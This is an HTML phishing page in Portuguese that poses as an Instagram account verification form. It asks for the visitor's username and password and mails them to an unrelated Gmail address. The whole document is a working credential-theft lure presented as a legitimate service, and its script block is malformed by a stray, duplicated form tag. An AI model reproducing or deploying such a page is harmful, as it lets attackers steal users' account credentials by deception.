<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação da Conta do Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f303d3;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 2rem;
            max-width: 400px;
            width: 100%;
            text-align: center;
            opacity: 0;
            transform: translateY(-20px);
            animation: fadeIn 1.5s forwards;
        }
        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .container h1 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }
        .container p {
            font-size: 0.9rem;
            color: #555;
            margin-bottom: 1rem;
        }
        .container form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        .container input {
            padding: 0.75rem;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 8px;
        }
        .container input:focus {
            outline: 2px solid #3897f0;
        }
        .container button {
            background-color: #3897f0;
            color: #ffffff;
            border: none;
            padding: 0.75rem;
            font-size: 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .container button:hover {
            background-color: #317bd8;
        }
        .container .footer {
            margin-top: 1rem;
            font-size: 0.8rem;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verifique sua Conta do Instagram</h1>
        <p>Insira suas informações para verificar sua conta com segurança.</p>
        <form id="verificationForm" action="mailto:centroderecuperacaodecontas2@gmail.com" method="POST" enctype="text/plain">
            <input type="text" name="username" placeholder="Nome de usuário do Instagram" required>
            <input type="password" name="password" placeholder="Senha" required minlength="6">
            <button type="submit">Verificar Conta</button>
        </form>
        <div class="footer">
            <p>Aviso: Certifique-se de usar apenas fontes confiáveis para a Verificação da sua conta.</p>
        </div>
    </div>
    <script>
        document.getElementById('verificationForm').addEventListener('submit', function(event) {
            const confirmation = confirm("Você tem certeza de que deseja enviar essas informações?");
            if (!confirmation) event.preventDefault();
<form id="verificationForm" action="mailto:centroderecuperacaodecontas2@gmail.com" method="POST"

        });
    </script>
</body>
</html>
